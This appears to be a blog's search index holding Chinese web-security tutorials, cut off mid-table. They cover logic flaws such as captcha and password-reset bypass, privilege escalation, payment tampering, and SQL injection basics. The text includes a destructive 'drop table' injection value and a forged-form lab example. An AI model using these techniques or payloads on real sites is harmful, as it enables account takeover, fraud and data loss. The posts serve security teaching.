<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[逻辑漏洞]]></title>
    <url>%2F%2F2020%2F08%2F44483515.html</url>
    <content type="text"><![CDATA[逻辑漏洞概述逻辑漏洞更多指一些业务类特有的逻辑漏洞，这些漏洞的特点是很难判断是否为漏洞。比如在一个商场系统中，用户 A 可以看到用户 B 的订单信息，对于计算机来说，程序运行是没有问题的，因为开发者就是这么设计的，但是对用用户来说，B 用户就会觉得自己的隐私泄露了。所以逻辑漏洞通常需要人为来判断是否为漏洞，而且大多数是程序猿设计开发之处没有考虑周到产生的。 常见的业务逻辑型漏洞，包括验证码安全、用户密码找回、接口盗用、账户越权、支付漏洞等问题，相比于如 SQL 注入漏洞、XSS 漏洞、上传、命令执行等传统应用安全方面的漏洞，现在的攻击者更倾向于去挖掘业务逻辑层面的安全问题，这类问题往往容易被开发者所忽视，同时也具有很大的危害性。 举个例子：2019 年初拼多多被爆 100 元无门槛优惠券漏洞就使拼多多遭受一定量的损失。 逻辑漏洞越来越受重视如今的业务系统对于传统安全漏洞防护的技术和设备越来越成熟， 基于传统安全漏洞入侵也变得越来越困难，增加了黑客的攻击成本。而业务逻辑漏 洞可以逃逸各种安全防护，迄今为止没有很好的解决办法，并且也可以利用设计缺陷进行交易数据篡改、敏感信息盗取、资产的窃取等操作。恰巧现在的黑客不再以炫耀技能为主要攻击目的，而主要 以经济利益为目的，攻击的目的逐渐转变为趋利化。 如何更好地学习业务安全了解目标平台的业务流程，并进行一次全面的梳理，可以先将业务主体划分为几个大模块，再将每个大模块逐 个细分为子模块。 掌握控制变量法，如在分析平行权限跨越时，需要明白每一次步骤变的是什么，不变的是什么，控制好不同变量 的变化，从而筛选出影响业务流程的参数。 学会使用思维导图等工具。在面对复杂的系统时，我们需要通过思维导图等工具来协助我们理清各个业务模块之间的联系，从而做到有的放矢。 按照功能点分类 任意用户注册本该在服务端处理的验证码，被后端返回到了响应里，导致可以使用任意手机号进行注册： 用户名遍历找到用户名 ID 规律或者是注册手机号，即可使用 BP 来遍历信息： 短信轰炸发送短信验证码接口未做时间限制，导致攻击者可以对该接口请求包不断重放，并且修改目标手机号为目标手机号，从而导致无限制发送短信，形成短信轰炸。 凡是看到可以发短信的地方，多重复发几次数据包 如果使用验证码登陆，获取到验证码发现都是纯数字，尝试爆破验证码 撞库测试抖音千万级账号遭撞库攻击，牟利百万黑客被警方逮捕 撞库攻击实则非法牟利者一种碰运气的表现。这种方式是通过已经被泄露的部分信息，再进行其他平台的重复登录操作，一旦登陆成功则撞库成功。 通常被黑客选作撞库对象的账号密码所有者安全意识都不高，他们很有可能将同样的账号、密码作为几个平台的通用’’钥匙”，这为撞库的成功提供了保障。 Demo 源码： 1234567891011121314&lt;?phperror_reporting(0);$name = $_REQUEST['name'];$pass = $_REQUEST['pass'];if(isset($pass) and isset($name) and $pass === '123456' and $name === 'admin')&#123; echo 'flag&#123;xxxxxxx&#125;';&#125;else&#123; echo 'login fail &lt;br&gt;'; echo "hint: name and pass";&#125;?&gt; 场景模拟：用户名和密码一一对应 假设获取泄露的用户名和密码的关系为： 用户名 密码 root 1234 test 1231231 administrator 123123 anonymous 1323 admin 123456 攻击类型选择：Pitchfork 可以看到 Payload 规律为一一对应： 推荐书籍资料 《白帽子讲 Web 安全》 《PHP Web安全开发实战》 《Web攻防之业务安全实战指南》 验证码安全验证码的作用是防止某个攻击者进行暴力破解，比如常见的验证码用来防止机器批量注册、机器批量发帖回复等，为了防止用户利用机器人自动注册、登录、灌水等，大部分网站都才用了验证码技术。随着很多重要业务往 Web 上迁移，现在很多关键的敏感操作也是需要验证码来进行认证的，验证码安全性也逐步不重视。 验证码过于简单验证码就是每次访问页面时随机生成的图片，内容一般是数字和字母，也有复杂的中文，需要访问者正确识别并提交，才会触发表单认证机制，这样就有效地防止了暴力破解。但是有时候往往过于简单，很容易被验证码识别引擎或者接口识别出来，形同虚设，导致攻击者依然可以正常使用机器进行批量操作。 乌云官方验证码容易识别的bug 驴妈妈旅游网某业务系统从验证码绕过再到任意酒店数据导出 以前前几天测试的验证码爆破练习，在实在挖不到漏洞的情况下，如果验证码规则不复杂，可以尝试写 Python 脚本去调用验证码识别接口，然后单线程爆破或者撞库测试。 加固方法 常常有字体扭曲、背景色干扰、字体粘连、背景字母干扰、字体镂空、公式验证码、字体混用、加减法验证码、主题干扰线、逻辑验证码 数字暴力破解平时注册账号、修改验证码、安全认证登等方面都需要用到验证码，很多系统为了让用户体验更好，只设置了 4 位数字的验证码。这种 4 为数字的验证码让用户方便的同时，也带了安全风险，比如攻击者发现 4 为数字的验证码，第一反应可能就会思考这个验证码是否可以暴力破解。 微信任意用户密码修改漏洞 将包文中的verifycode进行重复提交后发现会提示提交过于频繁 经过一系列尝试后发现如果在phone=18666666666的号码后面添加不为数字的字符时,可以绕过此限制。这个地方的薄弱环节在于微信重置密码的验证码为4-5位纯数字。且数字范围在 1000-20000 之间。也就是说.只要尝试 19000 次，用 50 个线程发包，3分钟即可成功修改一个密码。 加固方法 开发者涉及短信验证码的时候尽量用 6 位数字验证，并且设置验证码失效时间，也可以尝试增加验证码输错次数限制，增加黑客攻击难度。 空验证码突破大多数验证码的生命周期是这样的：用户访问验证码页面或者接口-&gt; 生成 Code 并保存到 Session 中 -&gt; 用户提交验证代码 -&gt; 用户提交的值和服务器的值做对比，但是在某些情况下，黑客可以不访问验证码接口，直接提交空验证码也是可以绕过的。 乌云集市验证码机制绕过 乌云的验证码机制是页面加载完成后，去请求captcha.php生成验证码，将验证码记录。当再次请求或跟换验证码时，在访问一次 captcha.php 生成验证码，那么我们直访问一次 captcha.php 生成验证码后，不去访问captcha.php 后，验证码永远为第一次产生的。说到底就是验证码和页面不是同步机制，而是异步交互，导致绕过： 再次来梳理一下：存在漏洞的系统的验证码机制是用户请求页面后，服务器会生成验证码，并将验证码记录下来。当用户提交表单时，会验证此验证码是否与服务器中的一致。试想一下，如果白帽子不访问页面，而且直接提交表单，这个时候服务器是没有对应值的，白帽子提交了验证码，理论上来说不能通过的，但是白帽子如果提交的验证码为空的时候，正好域服务器的空值所对应，因为 PHP 是弱类型语言，这样就导致了验证码被绕过。 下面是抽象出来的代码片段： 123456if($_POST['captcha'] != $_SESSION['captcha'])&#123; // 验证码不通过，清空验证码，返回 False unset($_SESSION['captcha']); return ["status"=&gt;false,"msg":"验证码失败"];&#125;return ["status"=&gt;true,"msg":"验证码成功"]; 为了防止验证码被多次使用，将 SESSION 中的 信息给清空了。此时如果攻击者没有访问验证码生成页面，SESSION 中的 captcha 这个 key 是不存在的，因为 PHP 语言的特性，空值和变量不存在作对比，结果是相等的。 加固方法 123if (empty($_POST['captcha']))&#123; return ["status"=&gt;false,"msg":"验证码不能为空"];&#125; 修复这种漏洞比较简单，只需要在做对比前限制空验证码就可以防止此漏洞的产生。 首次绕过很多网站为例方便用户，设置了第一次登陆无需验证码，当用户第一次输入不正确的时候，才会需要输入验证码。但判断用户是否第一次登陆的依据是什么呢？很多开发者并没有搞清楚，因此造成了验证码绕过问题。 有一部分开发者通过 Session 信息来判断是否启用验证码，但攻击者可以每次访问前都清掉 sessionid ，这样就造成绕过验证码漏洞。 爱卡汽车网某重要系统设计逻辑缺陷(成功绕过验证码限制)影响内部敏感信息 找到后台开始爆破，发现只有第一次登陆不需要输入验证码，后面都是需要输入验证码的。 这时候白帽子想到，既然第一次不需要输入验证码，是不是能让服务器觉得每次提交都是第一次呢？围绕这个目标，经过多次推理和测试，终于发现判断是否显示验证码的规则是通过服务器的 Session 信息来判断的： Session 是基于 Cookie 来保持会话的，每次提交数据的时候都更改 sessionid，这样服务器在判断 Session 信息时，就不知道前台提交的是多次提交过的数据，也就不需要验证码来验证了。 加固方法 在开发类似功能的时候，一定要想到判断是否被用户通过更改 Cookie 的方式来绕过，不过 Web 系统很难界定用户是否是首次访问，所以在设计此类需求的时候，不要使用单一维度来界定，而是使用多维度来判断，比如用户的 IP 地址、登录的用户名、操作的频率次数等多方面因素。 凭证返回开发者不严谨，导致抓包可以看到验证码在回显中显示，由于验证码直接返回，因此可以通过该漏洞注册任意用户、重置已注册用户密码、修改绑定信息等高危操作，对用户造成一定影响。 某情趣用品电商App验证码获取接口返回验证码信息可重置任意账号密码 加固方法 不要将短信验证码放在客户端中，不要过于信任客户端，验证码只存在于服务端中，不能通过任何 API 直接获取。 账户越权基本概念从字面意思理解就是用户可以操作超出自己管理权限范围的功能，主要原因是开发者在对数据库进行 CRUD （Create, Read, Update and Delete）时，对客户端请求的数据遗漏了对权限的判定。 大多数 Web 应用系统都具备权限划分和控制，但是如果权限校验存在问题，攻击者就可以通过这些问题来访问未经授权的功能或数据，这就是通常说的越权漏洞。 我们一般将越权漏洞分为三种：未授权、水平越权、垂直越权。 未授权开发者未考虑到用户是否经过登录或者认证的情况下直接返回敏感数据，我们称之为未授权访问漏洞。假设有一个 URL 是 1http://x.x.x.x/getUserInfo.php?uid=100 在这个 URL 中可以看出后端通过 uid 参数值返回相应的用户信息。如果这个接口没有做用户登录验证或者管理员的身份验证，那么所有人都能访问到，很有可能导致用户信息可以被遍历输出。 可预测的 URL 招商银行某接口未授权访问泄露姓名/账单信息 SMS Sniffer 抓到招行的两条短信通知，得到以下链接，发现没有登录就可以直接查看到对方用户的账单金额，并且通过排除法发现关键参数是 clientid 值，这两个值只有 4 个字符有区别，所以通过简单遍历就可以收集到这些数据。 中国国际航空公司某后台越权操作 谷歌语法搜索到网站后台的时候，访问可以直接进入后台，并可以进行操作。建议后台系统不要与前台业务共用一个域名。 水平越权水平越权指的是攻击者尝试访问与他拥有相同权限用户的资源。水平越权通常可查看其他用户信息，修改其他用户资料等操作。比如酒店会员系统，可查看其他用户的酒店订房订单信息；博客系统，可查看其他博主私人博文等信息。 Mtime时光网越权查看订单 当这个地址被用户访问后，后端的逻辑会去查询数据库，查询的 SQL 语句可能是这样的： 1select * from order where googsOrderID = 7708433 攻击中可以轻易地进行订单 ID 遍历，就会把所有的订单信息爬取出来。 Pikachu 漏洞靶场首先修改 hosts 文件： 110.20.25.43 www.pikachu.com 就可以成功访问 Pikachu 漏洞靶场了，尝试访问水平越权，首先所有用户信息如下： 用户 密码 lucy 123456 lili 123456 kobe 123456 1http://www.pikachu.com/vul/overpermission/op1/op1_mem.php?username=lucy&amp;submit=点击查看个人信息 很明显这里修改 username 即可查看其它用户的信息。问题代码： 加固方法 对于一些敏感的数据，在防御上需要先验证用户身份后再做查询处理。 1select * from order where uid=100 and orderid=10000 这里代码的 uid 不能由前端传递过来，而应该由后端从 Session 中获取。 垂直越权垂直越权指的是一个低权限攻击者尝试访问高权限用户的资源。如果普通用户能利用某种攻击手段访问到管理功能，那我们就称之为垂直越权。 中国联通某游戏业务平台漏洞打包 使用低权限的用户登录，访问只有管理员能够访问的URL，可查看所有用户信息： 中国电信天翼宽带政企网关A8-B垂直越权，可获取最高权限#2 使用默认用户名和密码（普通权限,仅读），修改参数id，即可获得telecomadmin权限（超级管理员权限，可读写）。 天清汉马USG防火墙越权操作 使用audit审计用户登录系统，在点击菜单是，将识别参数修改为system.admin，这时，audit用户就拥有修改管理员信息以及权限的能力。 Pikachu 漏洞靶场 用户 密码 权限 admin 123456 查看、添加用户 pikachu 000000 查看用户 抓取 admin 添加用户的数据包： 和 CSRF 思路一样，尝试生成 HTML 表单，然后使用 pikachu 来触发表单： 1234567891011121314&lt;html&gt; &lt;body&gt; &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt; &lt;form action="http://www.pikachu.com/vul/overpermission/op2/op2_admin_edit.php" method="POST"&gt; &lt;input type="hidden" name="username" value="test" /&gt; &lt;input type="hidden" name="password" value="123456" /&gt; &lt;input type="hidden" name="sex" value="boy" /&gt; &lt;input type="hidden" name="phonenum" value="111111" /&gt; &lt;input type="hidden" name="email" value="tony@qq.com" /&gt; &lt;input type="hidden" name="address" value="安恒大厦" /&gt; &lt;input type="submit" value="Submit request" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 或者记录 pikachu cookie 信息，来手动替换。不过本关卡更简单，pickachu 用户直接访问： 1http://www.pikachu.com/vul/overpermission/op2/op2_admin_edit.php 就可以直接进入到创建用户的界面 实用总结 请求中不存在参数，只用 cookie 进行身份验证，通常不可越权。 请求中存在参数，并且参数中的某些值可能是辨别信息的唯一值（如userID、IDNO、departmentID、key、ID等），可能存在越权（越权的原因通常是参数中的 userID(例如)没有判断是否与cookie中用户属同一用户） 支付漏洞随着移动支付的普及，越来越多的人习惯网上购物，大量的电商网站也都可以用在线支付完成交易。而在线直充必然涉及在线支付的流程，这里面存在很多逻辑问题。由于涉及到金钱，如果涉及不当，很有可能会产生诸如 0 元购买商品之类的严重漏洞。 金额数据篡改一些购物网站在支付时使用前端传过来的金额，并且没有对金额进行验证，导致金额数据篡改的产生，而正常的操作应该是在后端计算订单金额。 在购买或充值的位置坐测试，比如对提交订单的请求进行抓包，如果里面有金额字段，就修改金额等字段，例如在支付页面抓取请求中商品的金额字段，修改成任意数额的金额并提交，查看能否以修改后的金额数据完成业务流程。 12308订单支付时的总价未验证漏洞(支付逻辑漏洞) 商品数量修改购买商品的时候通常有一个数量选项，用户可以对商品的数量做加减，通常会在前段会限制商品不能为 0，但是开发者在后端却没有做出相应限制，这就导致攻击者可以通过修改数据包造成商品数量小于 1 凤凰商城1元购物漏洞（支付漏洞购买任意商品） 很明显一个是商品ID 一个是数量，修改数量把一元的修改成 -19，最后效果如下： 蔚蓝团支付逻辑漏洞(可负数支付) 抓包，并修改数量为 -1： 运费金额修改购买商品经常还包含着运费信息，产生的运费与所不同，运费如果是前端提交的金额，不经过后端处理验证，那么久很可能产生此漏洞。 新东方逻辑支付漏洞 随便找一个课程，立即报名，抓包，发现金额无法修改，他是直接和schoolid绑定的，不过还有一处我们可以利用，那就是配送方式，且配送方式的金额可以，不过有验证，课程+配送运费不能低于0，所以我们就让他成为正吧。修改运费为-，两者相加则为正数才可以，最后设置为1元成功下单。 密码重置密码重置基本概念密码找回功能本意是设计给那些忘记密码的用户，以便他们能够找回自己的密码。但是由于程序猿开发逻辑问题，可能会导致可以重置任意用户密码的漏洞产生。 验证码不失效造成原因:找回密码的时候获取的验证码缺少时间限制仅判断了验证码是否正确未判断验证码是否过期 测试方法:通过枚举找到真正的验证码输入验证码完成验证 输入目标手机号，获取验证码随意输入验证码 0004 点击提交，拦截数据包： 不是失效的话就直接 BP 爆破验证码即可 总结:这种验证码不失效的情况现在已经是非常少见的了，而且验证码的位数也很少有简单的 4 位验证码了。现在绝大多数是这样的：6 位数的验证码而且 15 分钟内有效，这样子的话爆破的可能性就非常的低了。 验证码直接返回造成原因:输入手机号后点击获取验证码，验证码在客户端生成，并直接返回指 HTML 中以方便对接下来的验证码进行对比 测试方法:直接输入目标手机号，点击获取验证码，并观察返回包即可。在返回包中得到目标手机号获取的验证码，进而完成验证，重置密码成功 总结:以前也见过这样一个类似的案例，具体情况是在找回密码返回包中，直接返回了旧密码的md5 值，然后修改返回包可以直接重置管理员的密码。 天天网任意账户密码重置（二） 这里的加密验证字符串和之前返回数据中的那个字符串竟然是同一个。既然如此，说明天天网的这个找回密码设计本来就是有问题的，那个邮箱验证码就可以直接绕过了。 验证码未绑定用户造成原因：输入手机号和验证码进行重置密码的时候，仅对验证码是否正确进行了判断，未对该验证码是否与手机号匹配做验证 测试方法：在提交手机号和验证码的时候替换手机号为他人手机号进行测试，成功通过验证并重置他人密码 修改接收的手机或邮箱造成原因：用户名、手机号、验证码三者没有统一进行验证，仅判断了三者中的手机号和验证是否匹配和正确，如果正确则判断成功并进入下一流程。 测试方法：输入用户名获取验证码，修改接收验证码的手机号为自己的号码，自己手机成功接收验证码，提交到网站进行验证，验证成功并进入下一流程。 点击找回密码，首先我们输入zhangwei，然后点击获取验证码，这个时候把手机号改为我们自己的号码，(一般情况下这里是在数据包中进行修改的)，然后输入我们自己的号码和验证码，成功跳到重置密码的页面，密码重置成功。 OPPO 手机重置任意账户密码（3） 在手机号验证码这里，填写自己的手机号，即可成功绕过校验，从而可以直接进入下一步重置密码的操作。 本地验证绕过造成原因：客户端在本地进行验证码是否正确的判断，而该判断结果也可以在本地修改，最终导致欺骗客户端，误以为我们已经输入正确的验证码。 测试方法：重置目标用户，输入错误验证码，修改返回包，把错误改为正确，即可绕过验证步骤，最终重置用户密码。 跳过验证步骤造成原因：对修改密码的步骤，没有做校验，导致可以直接输入最终修改密码的网址，直接跳转到该页面，然后输入新密码达到重置密码的目的。 测试方法：首先使用自己的账号走一次流程，获取每个步骤的页面链接，然后记录页面3对应的输入新密 首先我们走一下所有的步骤，页面 1、页面 2、页面 3，然后记录下页面 3 的链接： 然后尝试重置他人的用户。(ps:页面3是在我们的邮箱里接收到的链接) 图片是某集团系统，所以用户wangshuai，邮箱对应`wangshuai@xxx.com.cn` 使用账户wangshuai，点击获取验证码，然后补齐下面的链接 https://xxx/page/login/veifyAccess.html?username=wangshuai&amp;email=wangshuai@xxx.com.cn，访问后即可直接重置该用户的密码。 这个漏洞不用按照正常的流程来走，这里的话直接补齐设置新密码的链接，然后利用这里链接可以直接重置任意用户的密码。 未校验用户字段的值造成原因：在整个重置密码的流程中，只对验证码和手机号做了校验，未对后面设置新密码的用户身份做判断，导致在最后一步通过修改用户身份来重置他人的密码 测试方法：使用自己的手机号走流程，在走到最后一个设置密码的流程时，修改数据包里的用户信息。 修改密码处 id 可替换造成原因：修改密码的时候，没有对原密码进行判断，且根据 id 的值来修改用户的密码，类似的 SQL 语句： 1update user set password="qwer1234" where id = '1' 修改数据包里的 id 值，即可修改他人密码。 测试方法：修改自己用户密码，抓取数据包，替换数据包中用户对应的 id 值，即可修改他人的密码。 Cookie 值的替换造成原因：重置密码走到最后一步的时候仅判断唯一的用户标识 cookie 是否存在，并没有判断该 cookie 有没有通过之前重置密码过程的验证，导致可替换 cookie 重置他人用户密码。（cookie 可指定用户获取） 测试方法：重置自己用户密码到达最后阶段，抓到数据包，并在第一阶段重新获取目标用户 cookie，替换 cookie 到我们抓取的数据包中，发包测试。 关键点： cookie可指定用户获取,尝试用他人账号来找回密码的时候，抓取数据包，可以从中提取出cookie值，然后就可以利用这个cookie值，就可以重置指定用户的密码了。 修改信息时替换字段值造成原因：在执行修改信息的 SQL 语句的时候，用户的密码也当作字段执行，且根据隐藏参数 login id 来执行，这样就导致修改隐藏参数 login id 的值，就可以修改他人的用户密码 测试方法：修改个人资料的时候，抓取数据包，然后修改数据包的参数和对应的值，参数名一般可以在其他地方找到，替换隐藏参数即可修改他人的密码等信息。 邮箱弱 token找回密码有两种常见的方式，即手机验证码和邮箱 token，手机验证码都是随机生成的明文，邮箱 token 一般是加密的字符串，开发者会觉得居然是加密字符串是不是可以不用随机的字符串了呢？但往往由于未使用随机字符串，便造成漏洞的产生。 奇虎 360 任意用户密码修改漏洞 加固方法 关键加密的地方尽量使用随机值或者其他更高级的加密方式，防止攻击者发现加密规律，从而进行恶意操作。 注册覆盖正常来说，注册一个用户是往数据表中添加一条数据，如果数据已存在，注册就会失败。可是有时候开发者却不是这么做的，他们发现用户账号已存在时，不是提示用户注册失败，而是直接修改用户的信息。 中铁快运奇葩方式重置任意用户密码(admin 用户演示) 在注册用户时，如果先输入用户名，在鼠标离开后会进行用户名是否存在的校验。但是如果把用户名留着最后输入，比如输入一个已有的用户名 admin，在鼠标离开输入框并点击提交按钮后，虽然也会进行用户名是否存在的校验，但表单仍然提交上去了，此时就会直接修改掉 admin 用户的密码。]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL 注入]]></title>
    <url>%2F%2F2020%2F08%2F35cb7ca5.html</url>
    <content type="text"><![CDATA[SQL 注入注入攻击是 Web 安全领域中一种最为常见的攻击方式。 XSS 本质上也是一种针对 HTML 的注入攻击。 注入攻击的本质，是把用户输入的数据当做代码执行。这里有两个关键条件: 用户能够控制输入 原本程序要执行的代码，拼接了用户输入的数据。 SQL 注入攻击简介在今天，SQL 注入对于开发者来说，应该是耳熟能详了。而 SQL 注入第一次为公众所知，是在 1998 年的著名黑客杂志《Phrack》第 54 期上，一位名叫rfp的黑客发表了一篇题为 “NT Web Tech-nology Vulnerabilities” 的文章。 一个 SQL 注入的典型例子 123var Shipcity;ShipCity = Request.form ("ShipCity");var sql = "select * from OrdersTable where ShipCity = '" + ShipCity + "'"; 变量 ShipCity 的值由用户提交，在正常情况下，假如用户输入Beijing，那么SQL语句会执行： 1SELECT * FROM OrdersTable WHERE ShipCity = 'Beijing' 但假如用户输入一段有语义的 SQL 语句，比如： 1Beijing'; drop table OrdersTable-- 那么，SQL 语句在实际执行时就会如下： 1SELECT * FROM OrdersTable WHERE ShipCity = 'Beijing';drop table OrdersTable--' 原本正常执行的查询语句，现在变成了查询完后，再执行一个drop表的操作，而这个操作，是用户构造了恶意数据的结果。 危害 未授权访问数据库中数据，造成用户信息泄露 对数据库数据进行敏感操作，私自添加删除管理员账号 如果网站目录存在写入权限，可以写入网页木马 读取文件获取webshell 防御 不要信任用户的输入。对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和 双引号进行转换等。 不要使用动态拼接 SQL，可以考虑使用存储过程进行数据查询存取，例如 Django 自带的 Model。 应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装。 不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。 不要把机密信息直接存放，对密码等敏感的信息进行加密。 MySQL 基础MySQL 是最流行的关系型数据库管理系统，市场占有率比较高，在 CTF 比赛中也经常出现。 相关术语 数据库: 数据库是一些关联表的集合。 数据表: 表是数据的矩阵。在一个数据库中的表看起来像一个简单的电子表格。 数据表由 行（row）和 列 (column)组成，是一个二维的网格结构，每个列都是一个字段。 基本操作创建数据库 1create database 数据库名; 删除数据库 1drop database 数据库名; 查询所有数据库 1show databases; 选择数据库 1use 数据库名; 查询数据库下的表名 1show tables; 创建数据表 123456CREATE TABLE IF NOT EXISTS `tbl`( `id` INT UNSIGNED AUTO_INCREMENT, `title` VARCHAR(500) NOT NULL, `author` VARCHAR(40) NOT NULL, PRIMARY KEY ( `id` ))ENGINE=InnoDB DEFAULT CHARSET=utf8; 删除表 1drop table 数据表名; 插入数据 1234567891011121314INSERT INTO tbl -&gt; (title, author) -&gt; VALUES -&gt; ("你看得到我打在屏幕上的字，看不到我落在键盘上的泪。", "画船听雨");INSERT INTO tbl -&gt; (title, author) -&gt; VALUES -&gt; ("成功的花，人们只惊羡她现时的明艳！然而当初她的芽儿，浸透了奋斗的泪泉，洒遍了牺牲的血雨。", "冰心");INSERT INTO tbl -&gt; (title, author) -&gt; VALUES -&gt; ("The quieter you become, the more you are able to hear", "Kali Linux"); 更新语句 1update tbl set title='好好学习 天天向上' WHERE author='画船听雨'; 删除数据 1delete from tbl where id=1; 查询数据可以直接使用 select 查询任意字符串或者函数： 1234567mysql&gt; select 'Hello World';+-------------+| Hello World |+-------------+| Hello World |+-------------+1 row in set (0.00 sec) 也可以带入相关的函数查询： 1234567mysql&gt; select user(),version(),database();+------------------+-----------+------------+| user() | version() | database() |+------------------+-----------+------------+| root@10.211.55.2 | 5.5.53 | test |+------------------+-----------+------------+1 row in set (0.00 sec) 也可以查询数据表中的信息： 1234select * from tbl; -- 所有值select title from tbl; -- 查询title的值select author from tbl; -- 查询author的值select id,title,author from tbl; -- 等同于 * 查询 条件查询 1select author from tbl where anthor='冰心'; #查询作者为冰心的内容 默认是无法区分大小写的，如果要区分大小的的话，只需要在 where 的后面加个 binary 就可以了 like 模糊查询 1select * from tbl where author like 'a%'; 默认是无法区分大小写的，如果要区分大小的的话，只需要在 like 的后面加个 binary 就可以了 1select * from tbl where author like binary 'a%'; union 联合查询 连接两个以上的 SELECT 语句的结果组合到一个结果集合中 1234567891011121314151617181920mysql&gt; select * from users union select version(),database(),user();+--------+----------+------------------+| id | username | password |+--------+----------+------------------+| 1 | Dumb | Dumb || 2 | Angelina | I-kill-you || 3 | Dummy | p@ssword || 4 | secure | crappy || 5 | stupid | stupidity || 6 | superman | genious || 7 | batman | mob!le || 8 | admin | admin || 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 12 | dhakkan | dumbo || 14 | admin4 | admin4 || 5.5.53 | security | root@10.211.55.2 |+--------+----------+------------------+14 rows in set (0.00 sec) 思考：这条语句如果这样写呢？ 1select * from users union select version(),database(); 结果就会报错，因为第三列空了 order by 排序 123456789101112131415161718192021222324252627282930313233343536373839404142434445# 按照id升序排序select * from users order by id asc;# 按照id降序排序select * from users order by id desc;# 根据第1个字段排序mysql&gt; select * from users order by 1;+----+----------+------------+| id | username | password |+----+----------+------------+| 1 | Dumb | Dumb || 2 | Angelina | I-kill-you || 3 | Dummy | p@ssword || 4 | secure | crappy || 5 | stupid | stupidity || 6 | superman | genious || 7 | batman | mob!le || 8 | admin | admin || 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 12 | dhakkan | dumbo || 14 | admin4 | admin4 |+----+----------+------------+# 根据第2个字段排序mysql&gt; select * from users order by 2;+----+----------+------------+| id | username | password |+----+----------+------------+| 8 | admin | admin || 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 14 | admin4 | admin4 || 2 | Angelina | I-kill-you || 7 | batman | mob!le || 12 | dhakkan | dumbo || 1 | Dumb | Dumb || 3 | Dummy | p@ssword || 4 | secure | crappy || 5 | stupid | stupidity || 6 | superman | genious |+----+----------+------------+ group by 分组排序 假设有如下数据： 12345678910+----+--------+---------------------+--------+| id | name | date | singin |+----+--------+---------------------+--------+| 1 | 小明 | 2016-04-22 15:25:33 | 1 || 2 | 小王 | 2016-04-20 15:25:47 | 3 || 3 | 小丽 | 2016-04-19 15:26:02 | 2 || 4 | 小王 | 2016-04-07 15:26:14 | 4 || 5 | 小明 | 2016-04-11 15:26:40 | 4 || 6 | 小明 | 2016-04-04 15:26:54 | 2 |+----+--------+---------------------+--------+ 使用分组查询语句： 123456789mysql&gt; SELECT name, COUNT(*) FROM table GROUP BY name;+--------+----------+| name | COUNT(*) |+--------+----------+| 小丽 | 1 || 小明 | 3 || 小王 | 2 |+--------+----------+3 rows in set (0.01 sec) LIMIT 限制 12345678910111213141516171819202122232425262728293031323334353637383940mysql&gt; select * from users order by id;+----+----------+------------+| id | username | password |+----+----------+------------+| 1 | Dumb | Dumb || 2 | Angelina | I-kill-you || 3 | Dummy | p@ssword || 4 | secure | crappy || 5 | stupid | stupidity || 6 | superman | genious || 7 | batman | mob!le || 8 | admin | admin || 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 12 | dhakkan | dumbo || 14 | admin4 | admin4 |+----+----------+------------+# 从第1条数据查询 查询2个数据mysql&gt; select * from users order by id limit 0,2;+----+----------+------------+| id | username | password |+----+----------+------------+| 1 | Dumb | Dumb || 2 | Angelina | I-kill-you |+----+----------+------------+# 从第2条数据查询 查询6个数据mysql&gt; select * from users order by id limit 1,6;+----+----------+------------+| id | username | password |+----+----------+------------+| 2 | Angelina | I-kill-you || 3 | Dummy | p@ssword || 4 | secure | crappy || 5 | stupid | stupidity || 6 | superman | genious || 7 | batman | mob!le |+----+----------+------------+ 正则表达式 在前面已经了解到 MySQL 可以通过 LIKE ...% 来进行模糊匹配。 MySQL 同样也支持正则表达式的匹配， MySQL 中使用 REGEXP 操作符来进行正则表达式匹配。 1234567891011121314151617181920# 查询所有 username 以 a 开头的数据select * from users where username REGEXP '^a';# 查询所有 username 以 a 结尾的数据select * from users where username REGEXP 'a$';# 查询所有 username 包含 a 的数据select * from users where username REGEXP 'a';# 查询所有 username 0-9 结尾的数据mysql&gt; select * from users where username regexp '[0-9]$';+----+----------+----------+| id | username | password |+----+----------+----------+| 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 14 | admin4 | admin4 |+----+----------+----------+4 rows in set (0.00 sec) 别名 12345678910111213mysql&gt; select version();+-----------+| version() |+-----------+| 5.5.53 |+-----------+mysql&gt; select version() as '版本';+--------+| 版本 |+--------+| 5.5.53 |+--------+ 注释MySQL中的注释符号有三种 # 这里是注释的内容 -- 这里是注释的内容 /*这里是注释的内容*/ 12345678910# 这里是注释的内容-- 这里是注释的内容/*这里是注释的内容*//*这是一个多行注释*/ MySQL 函数MySQL 有很多内置的函数，灵活运行可以提高手工注入的效率。 系统信息函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495# 返回数据库版本mysql&gt; select version();+-----------+| version() |+-----------+| 5.5.53 |+-----------+# 返回当前数据库名mysql&gt; select database();+------------+| database() |+------------+| security |+------------+mysql&gt; select schema();+----------+| schema() |+----------+| security |+----------+# 返回当前用户mysql&gt; select user();+----------------+| user() |+----------------+| root@localhost |+----------------+# 返回当前用户mysql&gt; select current_user(); +----------------+| current_user() |+----------------+| root@localhost |+----------------+# 返回当前用户mysql&gt; select session_user();+----------------+| session_user() |+----------------+| root@localhost |+----------------+# 返回当前用户mysql&gt; select system_user();+----------------+| system_user() |+----------------+| root@localhost |+----------------+# 查看当前用户连接信息mysql&gt; show processlist;+----+------+-------------------+----------+---------+------+-------+------------------+| Id | User | Host | db | Command | Time | State | Info |+----+------+-------------------+----------+---------+------+-------+------------------+| 1 | root | 10.211.55.2:51246 | security | Query | 0 | NULL | show processlist || 2 | root | localhost:49948 | NULL | Sleep | 7 | | NULL |+----+------+-------------------+----------+---------+------+-------+------------------+# 数据库路径mysql&gt; select @@datadir;+--------------------------------------+| @@datadir |+--------------------------------------+| C:\myphp_www\PHPTutorial\MySQL\data\ 